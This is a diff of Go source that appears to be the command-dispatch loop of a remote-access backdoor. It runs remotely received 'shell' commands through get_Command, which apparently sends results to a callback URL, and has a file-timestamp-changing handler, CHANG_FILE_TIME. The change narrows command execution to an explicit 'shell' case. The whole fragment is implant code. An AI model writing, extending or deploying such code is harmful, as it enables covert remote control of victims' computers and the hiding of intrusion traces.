@@ -697,7 +697,6 @@ func send() { //发送头部信息
                 continue
             }
             job = msg[0]
-            msg_cmd := strings.Join(msg[:len(msg)-1], "*//*")
             if len(msg) > 1 {
                 shell = string(msg[1])
             }
@@ -723,8 +722,10 @@ func send() { //发送头部信息
             case "CHANG_FILE_TIME":
                 go CHANG_FILE_TIME(shell, msg[2])
             /*code*/
+            case "shell":
+                go get_Command(shell, re_url,msg[len(msg)-1])
             default:
-                go get_Command(msg_cmd, re_url,msg[len(msg)-1])
+                continue
             }
         }
     }
